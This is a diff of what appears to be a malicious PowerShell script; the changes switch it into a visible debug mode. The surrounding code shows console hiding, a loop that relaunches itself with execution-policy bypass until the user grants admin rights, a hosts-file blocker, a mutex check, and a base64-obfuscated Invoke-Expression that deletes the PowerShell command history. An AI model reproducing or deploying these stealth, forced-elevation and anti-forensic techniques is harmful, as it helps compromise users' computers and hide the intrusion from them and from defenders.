@@ -1,4 +1,4 @@
-$debug = $false
+$debug = $true
 
 if ($debug) {
     $ProgressPreference = 'Continue'
@@ -36,7 +36,7 @@ function INVOKE-AC {
 }
 
 function Hide-Console {
-    if (-not $debug) {
+    if ($debug -eq $false) {
         if (-not ("Console.Window" -as [type])) { 
             Add-Type -Name Window -Namespace Console -MemberDefinition '
                 [DllImport("Kernel32.dll")]
@@ -226,7 +226,7 @@ function HOSTS-BLOCKER {
 function Request-Admin {
     while (!(INVOKE-AC)) {
         try {
-            Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle hidden -File `"$PSCommandPath`"" -Verb RunAs
+            Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
             exit
         }
         catch {}
@@ -894,6 +894,9 @@ if (INVOKE-AC -eq $true) {
         KDMUTEX
     }
     #removes history
+    if ($debug) {
+        Read-Host "Press Enter to continue..."
+    }
     I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
 }
 else {
